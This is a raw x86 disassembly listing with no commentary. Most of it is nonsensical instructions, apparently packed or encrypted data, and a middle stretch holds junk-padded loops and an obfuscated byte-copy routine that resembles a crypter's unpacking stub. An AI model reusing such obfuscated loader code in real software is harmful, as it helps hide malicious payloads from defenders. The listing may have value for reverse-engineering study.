  407f2f:	test   DWORD PTR [esi+0x7ccc53f4],edi
  407f35:	adc    BYTE PTR [edi],dh
  407f37:	sbb    al,0xbc
  407f39:	mul    DWORD PTR [eax]
  407f3b:	mov    edi,0x1d10b567
  407f40:	neg    DWORD PTR [eax+0xe267998]
  407f46:	ret    
  407f47:	cs cmc 
  407f49:	in     eax,0x81
  407f4b:	or     BYTE PTR [edx],ch
  407f4d:	into   
  407f4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f4f:	xchg   ebp,eax
  407f50:	js     0x407f16
  407f52:	jle    0x407fc7
  407f54:	jp     0x407fb5
  407f56:	mov    ah,0xc
  407f58:	and    ebx,DWORD PTR [ecx-0x212ec569]
  407f5e:	out    0x94,al
  407f60:	test   eax,0x9103df84
  407f65:	xchg   ebx,eax
  407f66:	scas   eax,DWORD PTR es:[edi]
  407f67:	add    al,0x2c
  407f69:	ret    0x767
  407f6c:	dec    ecx
  407f6d:	in     al,0xcd
  407f6f:	mov    ds:0x41107464,al
  407f74:	sbb    BYTE PTR [edx-0x69],ch
  407f77:	bound  edx,QWORD PTR [ebx-0x7d]
  407f7a:	test   DWORD PTR ds:0xd45b,edx
  407f7f:	dec    edi
  407f80:	push   ebp
  407f81:	popa   
  407f82:	dec    edi
  407f83:	rol    DWORD PTR [ecx+esi*4+0x54efc538],cl
  407f8a:	sub    BYTE PTR ds:0xc39e0ad6,bl
  407f90:	add    al,0xf
  407f92:	sub    DWORD PTR [edi-0x54],0x3d65ec
  407f99:	mov    ebp,0x80d8a12c
  407f9e:	adc    eax,0xad228034
  407fa3:	sar    DWORD PTR [ebx-0x69],0xc5
  407fa7:	repnz outs dx,DWORD PTR ds:[esi]
  407fa9:	mov    ecx,DWORD PTR [edi+eax*1-0x32]
  407fad:	dec    ecx
  407fae:	cmp    ah,al
  407fb0:	dec    ecx
  407fb1:	cdq    
  407fb2:	lahf   
  407fb3:	and    eax,0x970e58d2
  407fb8:	mov    edi,0xf2d1f05f
  407fbd:	sbb    BYTE PTR [eax],0x1a
  407fc0:	push   ebp
  407fc1:	push   eax
  407fc2:	xor    edx,DWORD PTR [ebp-0x6241fbd8]
  407fc8:	enter  0x6d3f,0x13
  407fcc:	sub    al,0x76
  407fce:	dec    esp
  407fcf:	pop    ecx
  407fd0:	fild   WORD PTR [ebp+ebp*4+0x27a063a8]
  407fd7:	inc    ebp
  407fd8:	dec    esi
  407fd9:	mov    ebx,0x1abcc0d8
  407fde:	add    ebp,edx
  407fe0:	rcr    DWORD PTR [ecx],0x9c
  407fe3:	adc    DWORD PTR [eax-0x27],ebx
  407fe6:	iret   
  407fe7:	jle    0x408050
  407fe9:	xchg   edi,eax
  407fea:	popf   
  407feb:	mov    ds:0x6a1f2f44,eax
  407ff0:	push   DWORD PTR [esi+0x8bc584e]
  407ff6:	cdq    
  407ff7:	bound  ebp,QWORD PTR [ebx]
  407ff9:	or     esi,esp
  407ffb:	cwde   
  407ffc:	test   DWORD PTR [ebx+eax*2+0x45d887fe],ebp
  408003:	jmp    0x4301:0x8c87a55b
  40800a:	int3   
  40800b:	dec    esi
  40800c:	es inc ecx
  40800e:	call   0x3456:0x5612beed
  408015:	repz das 
  408017:	or     ebp,ebp
  408019:	push   edi
  40801a:	sbb    bh,bh
  40801c:	pop    ecx
  40801d:	repz aas 
  40801f:	push   ds
  408020:	xchg   esp,eax
  408021:	jmp    0x8e4ef3fb
  408026:	popa   
  408027:	pop    edx
  408028:	fsubr  DWORD PTR [esi]
  40802a:	clc    
  40802b:	add    dh,BYTE PTR [ebp+0x74]
  40802e:	mov    eax,DWORD PTR [esi+0x2d]
  408031:	adc    al,0x51
  408033:	xchg   edi,eax
  408034:	pusha  
  408035:	test   al,0x5b
  408037:	cmp    BYTE PTR [edi+0x6b3d9186],al
  40803d:	xchg   ebx,eax
  40803e:	mov    cl,0xb9
  408040:	dec    esp
  408041:	mov    edx,0x785bc0f3
  408046:	lahf   
  408047:	cmp    BYTE PTR [edx],bl
  408049:	xchg   esp,eax
  40804a:	and    al,0x25
  40804c:	sub    eax,0x7eba1242
  408051:	add    BYTE PTR [ebx+eax*1+0x2e2ab1f3],bh
  408058:	push   es
  408059:	push   ebp
  40805a:	sahf   
  40805b:	jo     0x4080b1
  40805d:	xchg   ebx,eax
  40805e:	mov    cl,BYTE PTR ds:0x4a55d1cd
  408064:	jge    0x408019
  408066:	jge    0x4080e1
  408068:	and    cl,ch
  40806a:	and    al,0xae
  40806c:	(bad)  
  40806d:	adc    eax,0xcd835af7
  408072:	popa   
  408073:	ins    DWORD PTR es:[edi],dx
  408074:	mov    dh,0x3b
  408076:	or     eax,0xd8c59ff6
  40807b:	mov    ds:0x9c7dcc9d,al
  408080:	pop    ecx
  408081:	and    DWORD PTR [esi],ebx
  408083:	xor    esp,DWORD PTR [edx+0x6b99245f]
  408089:	pop    eax
  40808a:	cs stc 
  40808c:	jge    0x408031
  40808e:	xchg   ecx,eax
  408090:	and    eax,0xa5d22bce
  408095:	shl    BYTE PTR [eax+0x68],cl
  408098:	or     dl,cl
  40809a:	lds    ebx,FWORD PTR [edi-0x2b]
  40809d:	dec    edi
  40809e:	jbe    0x40811d
  4080a0:	dec    ebx
  4080a1:	stc    
  4080a2:	cmp    al,0x7b
  4080a4:	push   ds
  4080a5:	ret    
  4080a6:	or     al,0x4d
  4080a8:	cmp    dl,cl
  4080aa:	jbe    0x4080bc
  4080ac:	adc    DWORD PTR [ecx-0x60d64a74],ebx
  4080b2:	es mov ebp,gs
  4080b5:	ds inc edx
  4080b7:	adc    edi,DWORD PTR [ecx-0x6b0cd1be]
  4080bd:	inc    ecx
  4080be:	test   BYTE PTR [edi],0x23
  4080c1:	add    ecx,DWORD PTR [esi]
  4080c3:	jae    0x4080aa
  4080c5:	adc    DWORD PTR [ebp-0x8],edi
  4080c8:	jnp    0x408112
  4080ca:	fidivr DWORD PTR [eax+0x2f]
  4080cd:	or     bl,BYTE PTR [ebp-0x37290d25]
  4080d3:	sbb    DWORD PTR [ebp+0x26],edx
  4080d6:	jo     0x40809f
  4080d8:	dec    ebx
  4080d9:	jp     0x408099
  4080db:	mov    dh,0x1e
  4080dd:	(bad)  
  4080de:	lea    ebp,[edx-0x311698d6]
  4080e4:	aas    
  4080e5:	mov    dh,0x2b
  4080e7:	mov    cs:0x96abf1f3,eax
  4080ed:	or     edi,DWORD PTR [ebp+0x65c5f203]
  4080f3:	or     BYTE PTR [ebx],ch
  4080f5:	jns    0x4080a2
  4080f7:	sbb    al,0xfa
  4080f9:	rcr    DWORD PTR [ecx+0x457480c3],cl
  4080ff:	bound  esi,QWORD PTR [esi-0x5b8d94ae]
  408105:	fndisi(8087 only) 
  408107:	mov    ds:0xb6828c27,eax
  40810c:	dec    ecx
  40810d:	iret   
  40810e:	movlps xmm7,QWORD PTR [ecx+0x21b9b06d]
  408115:	inc    edi
  408116:	or     eax,0xfe67ff08
  40811b:	push   ecx
  40811c:	imul   esp,DWORD PTR [eax+0x1a9044c0],0x698a77f9
  408126:	cmp    esi,ebx
  408128:	xor    esi,DWORD PTR [ebp-0x20]
  40812b:	jbe    0x4081a1
  40812d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40812e:	lea    ebp,[ebx+0x347b9c8c]
  408134:	(bad)  
  408137:	jmp    0xe666:0xfa4928a1
  40813e:	sub    DWORD PTR [eax-0x53],0x47
  408142:	cld    
  408143:	(bad)
  408146:	adc    DWORD PTR [ecx*8+0x4452a4c7],esi
  40814d:	out    0x25,eax
  40814f:	test   al,0x38
  408151:	retf   0xe166
  408154:	adc    eax,0xfcd6ea56
  408159:	std    
  40815a:	jp     0x408119
  40815c:	(bad)  
  40815d:	mov    edi,0xd7918bd9
  408162:	and    al,0x90
  408164:	cmp    ecx,edi
  408166:	loop   0x4081a1
  408168:	popf   
  408169:	jns    0x4081c3
  40816b:	retf   0xe9b7
  40816e:	jo     0x4080fb
  408170:	cwde   
  408171:	cwde   
  408172:	in     eax,0xa0
  408174:	mov    ch,0xb0
  408176:	gs pop edi
  408178:	dec    esi
  408179:	data16 mov BYTE PTR [edi-0x10],cl
  40817d:	xchg   edx,eax
  40817e:	clc    
  40817f:	or     ecx,DWORD PTR [ebx+ecx*1+0xc]
  408183:	test   al,0x65
  408185:	je     0x4081e4
  408187:	int    0x32
  408189:	push   ebp
  40818a:	ret    
  40818b:	mov    cl,0x96
  40818d:	xchg   ebp,eax
  40818e:	jecxz  0x408150
  408190:	adc    edx,edx
  408192:	scas   eax,DWORD PTR es:[edi]
  408193:	repnz cmp al,0xdc
  408196:	push   edi
  408197:	retf   
  408198:	add    BYTE PTR [ecx-0xd4beb26],0x7a
  40819f:	out    dx,al
  4081a0:	mov    ebx,0xdb4b71
  4081a5:	loope  0x40817f
  4081a7:	lahf   
  4081a8:	repnz arpl WORD PTR [eax+ebp*4],dx
  4081ac:	imul   eax,DWORD PTR [ecx+0x4eb25b3b],0xffffffad
  4081b3:	pop    ebp
  4081b4:	data16 add al,0xfc
  4081b7:	cmp    ch,BYTE PTR [ebx+ebp*1]
  4081ba:	add    eax,0x6955750f
  4081bf:	mov    edx,DWORD PTR [esi-0x17]
  4081c2:	rol    DWORD PTR [ecx+0x32],0x8a
  4081c6:	out    0xfd,al
  4081c8:	mov    BYTE PTR [esi],ch
  4081ca:	hlt    
  4081cb:	idiv   DWORD PTR [edi]
  4081cd:	dec    ebx
  4081ce:	data16 adc BYTE PTR [edx+0x341b56bd],ah
  4081d5:	in     al,0x59
  4081d7:	pop    ebx
  4081d8:	add    dl,BYTE PTR [eax]
  4081da:	mov    ?,WORD PTR [eax]
  4081dc:	popf   
  4081dd:	jo     0x408181
  4081df:	xor    al,0xbd
  4081e1:	inc    eax
  4081e2:	test   eax,0x9310a13f
  4081e7:	imul   ebx,DWORD PTR [esi-0x4cb5ebe4],0xffffffe4
  4081ee:	cmp    cl,BYTE PTR ds:0xc7a0ee0f
  4081f4:	add    al,0xa4
  4081f6:	or     ebx,0x0
  4081f9:	lea    esp,[eax+0x67daaadf]
  4081ff:	xor    al,0x7d
  408201:	inc    ebx
  408202:	xchg   edi,eax
  408203:	add    edi,DWORD PTR [eax+0x5a]
  408206:	gs jmp 0x4081ca
  408209:	adc    bl,ch
  40820b:	mov    dh,0x2c
  40820d:	mov    edx,0x92cd96a9
  408212:	(bad)  
  408213:	sahf   
  408214:	js     0x408280
  408216:	xor    eax,DWORD PTR [edi+0x2ba74559]
  40821c:	or     eax,0xff9138bb
  408221:	jge    0x408205
  408223:	cdq    
  408224:	mov    edi,0xdbc107f8
  408229:	cmc    
  40822a:	jecxz  0x40822e
  40822c:	rol    edx,1
  40822e:	stos   BYTE PTR es:[edi],al
  40822f:	cs push edi
  408231:	cmp    ebx,DWORD PTR [edx]
  408233:	mov    ch,0x9a
  408235:	xor    edx,esp
  408237:	cmc    
  408238:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408239:	jg     0x4081f6
  40823b:	jb     0x408203
  40823d:	ret    
  40823e:	dec    esi
  40823f:	pop    es
  408240:	dec    ecx
  408241:	pop    ebx
  408242:	call   0xc4674463
  408247:	mov    edi,0x47f02a9a
  40824c:	mov    ch,0x40
  40824e:	jns    0x4081fd
  408250:	retf   0x30f4
  408253:	lds    eax,FWORD PTR [ebp+0x24b1fbee]
  408259:	sahf   
  40825a:	fstp   QWORD PTR [ecx-0x2b5d381e]
  408260:	shr    DWORD PTR [ebp-0x188d708d],0xad
  408267:	repnz sar BYTE PTR [ebx-0x786297ec],0xf6
  40826f:	or     esi,DWORD PTR [edx+0x30720dbe]
  408275:	(bad)  
  408276:	(bad)  [esi]
  408278:	ret    
  408279:	dec    edx
  40827a:	xor    eax,0xdccc41bb
  40827f:	(bad)  [eax]
  408281:	dec    eax
  408282:	int3   
  408283:	loopne 0x40824c
  408285:	scas   eax,DWORD PTR es:[edi]
  408286:	pop    ebp
  408287:	sar    ecx,1
  408289:	cmp    ah,BYTE PTR [ebx+0x57]
  40828c:	inc    esi
  40828d:	ins    DWORD PTR es:[edi],dx
  40828e:	(bad)  ss:[edx+ebx*4-0x14]
  408293:	xchg   esi,eax
  408294:	adc    eax,esp
  408296:	repnz in eax,dx
  408298:	mov    eax,ds:0xb1d065cd
  40829d:	and    ch,bl
  40829f:	ins    BYTE PTR es:[edi],dx
  4082a0:	mov    ecx,0x2264a55d
  4082a5:	jo     0x40830c
  4082a7:	je     0x4082ba
  4082a9:	jo     0x4082fb
  4082ab:	mov    ebx,?
  4082ad:	push   ss
  4082ae:	lods   eax,DWORD PTR ds:[esi]
  4082af:	enter  0x3af8,0x4f
  4082b3:	pop    edi
  4082b4:	imul   esi,edx,0xffffffe0
  4082b7:	in     al,0xbf
  4082b9:	fs cmp al,ch
  4082bc:	or     eax,0xc9fde5ff
  4082c1:	es retf 0xfd99
  4082c5:	int    0xb0
  4082c7:	push   ds
  4082c8:	ds das 
  4082ca:	mov    BYTE PTR [ebx-0x2c],ch
  4082cd:	push   ebx
  4082ce:	add    cl,dh
  4082d0:	inc    edi
  4082d1:	cmp    BYTE PTR [esi-0x64],ch
  4082d4:	pop    ecx
  4082d5:	fxam   
  4082d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082d8:	(bad)  
  4082d9:	loopne 0x4082cc
  4082db:	mov    ebx,0xde1a30cc
  4082e0:	cmp    dl,dl
  4082e2:	xchg   ebp,eax
  4082e3:	fbld   TBYTE PTR [ebp+0x30411118]
  4082e9:	jge    0x40828c
  4082eb:	sti    
  4082ec:	mov    esi,0x31523eb5
  4082f1:	lahf   
  4082f2:	in     eax,0x50
  4082f4:	adc    ecx,edi
  4082f6:	jns    0x40830b
  4082f8:	dec    ebp
  4082f9:	in     eax,0x3
  4082fb:	mov    eax,ds:0x58038af9
  408300:	or     DWORD PTR fs:[edi],esi
  408303:	jmp    0x4082d2
  408305:	(bad)  
  408307:	mov    al,ds:0x7565afe4
  40830c:	cmp    al,0xae
  40830e:	es aas 
  408310:	mov    dl,0x57
  408312:	inc    esp
  408313:	scas   eax,DWORD PTR es:[edi]
  408314:	(bad)  
  408315:	cmc    
  408316:	int3   
  408317:	out    dx,al
  408318:	pop    es
  408319:	adc    bl,BYTE PTR [edx]
  40831b:	pushf  
  40831c:	loopne 0x408371
  40831e:	popf   
  40831f:	jmp    0x794c:0x68c8efe8
  408326:	cmp    eax,ecx
  408328:	mov    ecx,0xa005b96e
  40832d:	les    edi,FWORD PTR [esi]
  40832f:	inc    ebp
  408330:	jno    0x4082f3
  408332:	stos   BYTE PTR es:[edi],al
  408333:	addr16 cmp cl,bl
  408336:	jle    0x40834a
  408338:	mov    esp,0xbd95cb3a
  40833d:	and    bh,cl
  40833f:	push   ecx
  408340:	mov    dl,0xd7
  408342:	sbb    al,0xb7
  408344:	mov    bl,0xdc
  408346:	call   0x2023:0x153f21c5
  40834d:	aam    0xad
  40834f:	mov    al,0x94
  408351:	adc    ax,0xd8b1
  408355:	add    DWORD PTR [ebx+0x68],0x4fdc289
  40835c:	mov    ah,0x58
  40835e:	fist   WORD PTR [esi+0x728dbed]
  408364:	retf   
  408365:	jmp    0x390e:0xe35779ec
  40836c:	aam    0x2c
  40836e:	ins    DWORD PTR es:[edi],dx
  40836f:	dec    eax
  408370:	ret    0xd1a4
  408373:	cdq    
  408374:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408375:	xchg   esp,eax
  408376:	dec    ecx
  408377:	aaa    
  408378:	sar    DWORD PTR [edx+0x74],cl
  40837b:	mov    eax,0x6ffd8029
  408380:	enter  0x545c,0xf2
  408384:	xchg   ecx,eax
  408385:	fild   WORD PTR [eax+0x7a]
  408388:	push   ds
  408389:	mov    ah,0xb6
  40838b:	jg     0x408322
  40838d:	xor    al,0x88
  40838f:	nop
  408390:	mov    dl,bh
  408392:	adc    BYTE PTR [eax],ch
  408394:	cdq    
  408395:	pop    edx
  408396:	sub    edi,DWORD PTR [ecx+0x76d814a]
  40839c:	paddusb mm4,QWORD PTR [edx]
  40839f:	xchg   dh,ah
  4083a1:	pusha  
  4083a2:	into   
  4083a3:	jle    0x40839f
  4083a5:	aam    0xbc
  4083a7:	or     DWORD PTR [eax+0x71a726eb],edx
  4083ad:	or     eax,DWORD PTR [esi+0x60]
  4083b0:	cs inc eax
  4083b2:	ins    BYTE PTR es:[edi],dx
  4083b3:	loop   0x4083b6
  4083b5:	sbb    DWORD PTR [eiz*4+0x221fee4],esi
  4083bc:	push   edi
  4083bd:	add    edi,esp
  4083bf:	add    ah,BYTE PTR [edx]
  4083c1:	adc    eax,0x2711abf9
  4083c6:	inc    edi
  4083c7:	cli    
  4083c8:	push   cs
  4083c9:	imul   BYTE PTR [edx+0x597a740e]
  4083cf:	push   0x43
  4083d1:	add    DWORD PTR [ecx-0x76b33035],0x31867a42
  4083db:	gs xchg ecx,eax
  4083dd:	push   ds
  4083de:	fstp   DWORD PTR [edi-0x50]
  4083e1:	rol    ch,0x93
  4083e4:	xchg   ebp,eax
  4083e5:	ficomp DWORD PTR [ebx]
  4083e7:	(bad)
  4083ea:	int    0x90
  4083ec:	xor    BYTE PTR [ebx-0x617eb1b9],bl
  4083f2:	sub    BYTE PTR [eax+0x10],ch
  4083f5:	test   al,0x8f
  4083f7:	dec    ecx
  4083f8:	jno    0x408478
  4083fa:	xchg   edi,eax
  4083fb:	loopne 0x40841b
  4083fd:	bound  eax,QWORD PTR [edx+ebx*4-0x43]
  408401:	test   DWORD PTR [edi],ecx
  408403:	cmp    ecx,DWORD PTR [edi-0x6afeebf5]
  408409:	lahf   
  40840a:	xlat   BYTE PTR ds:[ebx]
  40840b:	cmp    cl,dl
  40840d:	pop    esi
  40840e:	pop    ebx
  40840f:	leave  
  408410:	ret    0xc
  408413:	push   ebp
  408414:	mov    ebp,esp
  408416:	mov    DWORD PTR ds:0x4240aa,0xf89c85b5
  408420:	mov    DWORD PTR ds:0x42a00c,0x7dd6
  40842a:	pop    ebp
  40842b:	jmp    0x41b7a1
  408430:	xor    eax,eax
  408432:	or     DWORD PTR ds:0x42b010,0x429008
  40843c:	inc    eax
  40843d:	ret    
  40843e:	push   ebp
  40843f:	mov    ebp,esp
  408441:	sub    esp,0x10
  408444:	sbb    ecx,DWORD PTR ds:0x42d008
  40844a:	mov    eax,0xf89c85b6
  40844f:	mov    edx,DWORD PTR ds:0x42b000
  408455:	add    DWORD PTR ds:0x42c018,edx
  40845b:	mov    DWORD PTR [ebp-0x4],eax
  40845e:	dec    edx
  40845f:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  408466:	mov    DWORD PTR ds:0x42b01c,0x18
  408470:	cmp    DWORD PTR ds:0x42b01c,0x0
  408477:	je     0x4084ad
  40847d:	cmp    DWORD PTR ds:0x42b01c,0x1b
  408484:	jne    0x40849b
  40848a:	push   DWORD PTR [ebp-0x28]
  40848d:	push   0x7565
  408492:	push   DWORD PTR [ebp-0x18]
  408495:	call   DWORD PTR ds:0x425040
  40849b:	mov    edx,DWORD PTR ds:0x42b01c
  4084a1:	dec    edx
  4084a2:	mov    DWORD PTR ds:0x42b01c,edx
  4084a8:	jmp    0x408470
  4084ad:	mov    ecx,DWORD PTR [ebp-0x4]
  4084b0:	xor    edx,DWORD PTR ds:0x42b008
  4084b6:	push   esi
  4084b7:	mov    DWORD PTR ds:0x42c000,0x17
  4084c1:	cmp    DWORD PTR ds:0x42c000,0x0
  4084c8:	je     0x408518
  4084ce:	cmp    DWORD PTR ds:0x42c000,0xa
  4084d5:	jne    0x4084ec
  4084db:	push   0x8fa2
  4084e0:	push   DWORD PTR [ebp-0x24]
  4084e3:	push   DWORD PTR [ebp-0xc]
  4084e6:	call   DWORD PTR ds:0x425044
  4084ec:	cmp    DWORD PTR ds:0x42c000,0xb
  4084f3:	jne    0x408506
  4084f9:	mov    edx,DWORD PTR ds:0x42c000
  4084ff:	dec    edx
  408500:	mov    DWORD PTR ds:0x42c000,edx
  408506:	mov    edx,DWORD PTR ds:0x42c000
  40850c:	dec    edx
  40850d:	mov    DWORD PTR ds:0x42c000,edx
  408513:	jmp    0x4084c1
  408518:	mov    edx,0x7510893
  40851d:	xor    ecx,edx
  40851f:	and    DWORD PTR ds:0x429018,0x2759
  408529:	mov    esi,0x3272db
  40852e:	mov    DWORD PTR ds:0x42b01c,0x64d9
  408538:	push   edi
  408539:	mov    DWORD PTR ds:0x42c000,0x1c
  408543:	cmp    DWORD PTR ds:0x42c000,0x0
  40854a:	je     0x4085a2
  408550:	cmp    DWORD PTR ds:0x42c000,0xb
  408557:	jne    0x408573
  40855d:	push   DWORD PTR [ebp-0xc]
  408560:	push   DWORD PTR [ebp-0x10]
  408563:	push   0x6908
  408568:	push   0x2a1a
  40856d:	call   DWORD PTR ds:0x425048
  408573:	cmp    DWORD PTR ds:0x42c000,0xc
  40857a:	jne    0x40858f
  408580:	xor    edi,edi
  408582:	xor    edi,DWORD PTR ds:0x42c000
  408588:	dec    edi
  408589:	mov    DWORD PTR ds:0x42c000,edi
  40858f:	mov    edi,DWORD PTR ds:0x42c000
  408595:	dec    edi
  408596:	mov    DWORD PTR ds:0x42c000,edi
  40859c:	jmp    0x408543
  4085a1:	dec    edi
  4085a2:	mov    edi,DWORD PTR [ebp+0x10]
  4085a5:	xor    DWORD PTR ds:0x429004,0x6210
  4085af:	add    ecx,esi
  4085b1:	cmp    ecx,edi
  4085b3:	je     0x408678
  4085b9:	mov    ecx,DWORD PTR [ebp-0x4]
  4085bc:	mov    edi,DWORD PTR [ebp+0x10]
  4085bf:	xor    eax,eax
  4085c1:	xor    ecx,edx
  4085c3:	add    ecx,esi
  4085c5:	add    edi,0xfabdbef1
  4085cb:	adc    eax,0xffffffff
  4085ce:	xor    eax,0x0
  4085d1:	mov    DWORD PTR [ebp-0xc],eax
  4085d4:	push   ebx
  4085d5:	xor    ebx,ebx
  4085d7:	xor    edi,0x8a29a123
  4085dd:	mov    eax,ecx
  4085df:	add    eax,0xfabdbef1
  4085e4:	adc    ebx,0xffffffff
  4085e7:	xor    eax,0x8a29a123
  4085ec:	xor    ebx,0x0
  4085ef:	cmp    eax,edi
  4085f1:	jne    0x40860a
  4085f7:	cmp    ebx,DWORD PTR [ebp-0xc]
  4085fa:	je     0x408672
  408600:	jmp    0x40860a
  408605:	mov    esi,0x3272db
  40860a:	mov    eax,DWORD PTR [ebp-0x4]
  40860d:	mov    edi,DWORD PTR [ebp-0x8]
  408610:	xor    edi,edx
  408612:	add    edi,esi
  408614:	mov    esi,DWORD PTR [ebp+0x8]
  408617:	imul   edi,ecx
  40861a:	mov    ebx,DWORD PTR [ebp+0xc]
  40861d:	xor    eax,edx
  40861f:	add    eax,ecx
  408621:	mov    al,BYTE PTR [ebx+eax*1+0x3272db]
  408628:	mov    BYTE PTR [edi+esi*1],al
  40862b:	mov    eax,DWORD PTR [ebp-0x8]
  40862e:	mov    esi,DWORD PTR [ebp+0x10]
  408631:	xor    eax,edx
  408633:	xor    ebx,ebx
  408635:	add    esi,0xfabdbef1
  40863b:	adc    ebx,0xffffffff
  40863e:	lea    ecx,[ecx+eax*1+0x3272db]
  408645:	xor    edi,edi
  408647:	xor    esi,0x8a29a123
  40864d:	xor    ebx,0x0
  408650:	mov    eax,ecx
  408652:	add    eax,0xfabdbef1
  408657:	adc    edi,0xffffffff
  40865a:	xor    eax,0x8a29a123
  40865f:	xor    edi,0x0
  408662:	cmp    eax,esi
  408664:	jne    0x408605
  40866a:	cmp    edi,ebx
  40866c:	jne    0x408605
  408672:	mov    eax,0xf89c85b5
  408677:	pop    ebx
  408678:	pop    edi
  408679:	pop    esi
  40867a:	leave  
  40867b:	ret    0xc
  40867e:	push   ebp
  40867f:	mov    ebp,esp
  408681:	sub    esp,0x78
  408684:	adc    DWORD PTR ds:0x429000,0x42d00c
  40868e:	push   ebx
  40868f:	or     DWORD PTR ds:0x42d000,0x5016
  408699:	push   esi
  40869a:	sbb    DWORD PTR ds:0x42d008,0x6d64
  4086a4:	push   edi
  4086a5:	push   0x1f
  4086a7:	and    DWORD PTR ds:0x42d018,0x1f4a
  4086b1:	lea    eax,[ebp-0x78]
  4086b4:	push   eax
  4086b5:	not    DWORD PTR ds:0x42c008
  4086bb:	push   0x0
  4086bd:	xor    DWORD PTR ds:0x429008,0x2961
  4086c7:	jmp    0x40aa2c
  4086cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086cd:	xchg   esi,eax
  4086ce:	sub    edx,ebp
  4086d0:	out    0x65,eax
  4086d2:	arpl   WORD PTR [ebx+eiz*8+0x2f1a558d],dx
  4086d9:	xor    ebp,DWORD PTR [ebx+0x62185059]
  4086df:	bound  edi,QWORD PTR [edx]
  4086e1:	pop    edi
  4086e2:	bound  esp,QWORD PTR [edx+0x17]
  4086e5:	es adc bh,bl
  4086e8:	xor    ah,BYTE PTR [eax+0x71]
  4086eb:	jne    0x4086d0
  4086ed:	mov    esi,0xf33b7785
  4086f2:	iret   
  4086f3:	ret    0xc2dd
  4086f6:	lock mov esi,0xfa436f21
  4086fc:	or     dh,ch
  4086fe:	pop    edx
  4086ff:	adc    ch,BYTE PTR [edi-0x2c]
  408702:	gs out dx,eax
  408704:	lds    ecx,FWORD PTR [eax-0x49]
  408707:	add    BYTE PTR [ebx-0x66],ah
  40870a:	sahf   
  40870b:	ss (bad) 
  40870d:	clc    
  40870e:	and    DWORD PTR [esi],esi
  408710:	pop    esp
  408711:	out    dx,eax
  408712:	pop    es
  408713:	inc    esi
  408714:	add    DWORD PTR [ecx-0x2b],0xb153071f
  40871b:	int3   
  40871c:	mov    bl,0x34
  40871e:	cmc    
  40871f:	mov    eax,ds:0xeb3bb9b8
  408724:	inc    eax
  408725:	imul   edx,edi,0x85527a11
  40872b:	and    cl,bh
  40872d:	mov    BYTE PTR [ecx+0x5c61a79a],bl
  408733:	fild   WORD PTR [esi-0x76]
  408736:	sar    BYTE PTR [eax+0x381c671c],1
  40873c:	inc    edi
  40873d:	in     al,dx
  40873e:	sub    bh,bh
  408740:	ret    
  408741:	fwait
  408742:	scas   eax,DWORD PTR es:[edi]
  408743:	arpl   WORD PTR [edi],bx
  408745:	das    
  408746:	inc    edx
  408747:	adc    edx,DWORD PTR ds:0x2422bc00
  40874d:	push   es
  40874e:	rcl    edx,0xdd
  408751:	sbb    cl,0x2
  408754:	call   0xc5871674
  408759:	inc    edi
  40875a:	jp     0x40871c
  40875c:	mov    ds:0x17b19d35,al
  408761:	rol    DWORD PTR [ebp-0x77ed0bee],1
  408767:	call   0xae321af0
  40876c:	cwde   
  40876d:	push   es
  40876e:	outs   dx,DWORD PTR ds:[esi]
  40876f:	daa    
  408770:	pop    es
  408771:	xchg   edx,eax
  408772:	inc    eax
  408773:	aaa    
  408774:	and    eax,0xc778ca3c
  408779:	mov    dl,0x54
  40877b:	pop    eax
  40877c:	push   eax
  40877d:	imul   edx,eax,0x9304a5fd
  408783:	jnp    0x408791
  408785:	lock pop edi
  408787:	ins    BYTE PTR es:[edi],dx
  408788:	mov    ecx,0x4d35c25a
  40878d:	test   DWORD PTR [ecx-0x3f],ecx
  408790:	mov    WORD PTR [edx+0x69beef95],ds
  408796:	xchg   esp,eax
  408797:	dec    edx
  408798:	pop    ebx
  408799:	lock test DWORD PTR [ebx],ecx
  40879c:	pop    edx
  40879d:	popf   
  40879e:	jmp    0xc429:0x4496fa5e
  4087a5:	push   0x71
  4087a7:	aam    0x8e
  4087a9:	dec    esp
  4087aa:	jno    0x4087ae
  4087ac:	pop    edi
  4087ad:	ret    0x2a3
  4087b0:	xchg   esi,esi
  4087b2:	stos   DWORD PTR es:[edi],eax
  4087b3:	add    DWORD PTR [ebp+0x323ab0de],0xe930cd13
  4087bd:	add    eax,0xe07469da
  4087c2:	loope  0x4087cf
  4087c4:	pop    ecx
  4087c5:	or     esp,DWORD PTR [ecx-0x2d]
  4087c8:	sbb    cl,BYTE PTR [ebx+eiz*8+0x3078dc42]
  4087cf:	shl    DWORD PTR [ecx+0xe],1
  4087d2:	mov    al,0x6f
  4087d4:	bswap  ebx
  4087d6:	push   ds
  4087d7:	out    dx,eax
  4087d8:	jns    0x40876d
  4087da:	cmp    BYTE PTR [eax],bl
  4087dc:	mov    dh,0x6d
  4087de:	dec    eax
  4087df:	mov    eax,ds:0xe0f6aac9
  4087e4:	mov    dl,0x50
  4087e6:	stos   DWORD PTR es:[edi],eax
  4087e7:	push   edx
  4087e8:	repnz repz or BYTE PTR [ebx+esi*2+0x11],al
  4087ee:	pop    edi
  4087ef:	je     0x408870
  4087f1:	dec    edi
  4087f2:	stos   BYTE PTR es:[edi],al
  4087f3:	sbb    edx,DWORD PTR ds:0x9ffe8e4b
  4087f9:	or     DWORD PTR [edi],esp
  4087fb:	shl    BYTE PTR [edi+0x24],cl
  4087fe:	(bad)  
  4087ff:	ins    DWORD PTR es:[edi],dx
  408800:	pusha  
  408801:	ret    0xe8c9
  408804:	mov    ebx,cs
  408806:	es inc eax
  408808:	xchg   edx,eax
  408809:	mov    ah,0xa1
  40880b:	mov    ebx,0x428d37c5
  408810:	iret   
  408811:	pushf  
  408812:	dec    eax
  408813:	cdq    
  408814:	test   al,0xe
  408816:	jg     0x408814
  408818:	ss int 0x89
  40881b:	xchg   edi,eax
  40881c:	cmp    ah,BYTE PTR [eax]
  40881e:	out    0xa2,al
  408820:	and    dh,dl
  408822:	or     al,0xe8
  408824:	sub    edx,DWORD PTR [edx+0x74]
  408827:	mov    ebx,0x945e0200
  40882c:	jle    0x4088a6
  40882e:	mov    ds:0x48afdc11,al
  408833:	push   0x4e6e5848
  408838:	xchg   ecx,eax
  408839:	xchg   esi,eax
  40883a:	jge    0x408878
